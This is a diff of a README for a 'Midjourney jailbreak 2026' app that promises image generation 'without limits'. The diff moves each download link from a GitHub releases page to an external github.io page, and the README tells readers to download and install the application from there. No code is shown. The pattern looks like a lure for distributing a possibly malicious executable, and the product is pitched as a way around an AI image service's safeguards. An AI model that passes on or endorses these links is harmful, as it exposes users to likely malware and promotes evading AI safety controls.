@@ -1,6 +1,6 @@
 # 🎨 midjourney-jailbreak-2026 - Create Any Image Without Limits
 
-[![Download Now](https://img.shields.io/badge/Download-Midjourney_Jailbreak_2026-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/goiaalex90-svg/midjourney-jailbreak-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Midjourney_Jailbreak_2026-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://goiaalex90-svg.github.io)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Visit this link to download the application:
 
-**[https://github.com/goiaalex90-svg/midjourney-jailbreak-2026/releases](https://github.com/goiaalex90-svg/midjourney-jailbreak-2026/releases)**
+**[https://goiaalex90-svg.github.io](https://goiaalex90-svg.github.io)**
 
 When you arrive at the page, look for the **latest release** at the top. Click the download button next to the file name. Make sure you download the version that matches your operating system (Windows, Mac, or Linux).
 
@@ -171,7 +171,7 @@ The community and developers typically respond within 24 hours.
 
 ## ✅ Final Checklist
 
-- [ ] Downloaded the application from [the release page](https://github.com/goiaalex90-svg/midjourney-jailbreak-2026/releases)
+- [ ] Downloaded the application from [the release page](https://goiaalex90-svg.github.io)
 - [ ] Installed successfully
 - [ ] Signed in / created an account
 - [ ] Generated a test image
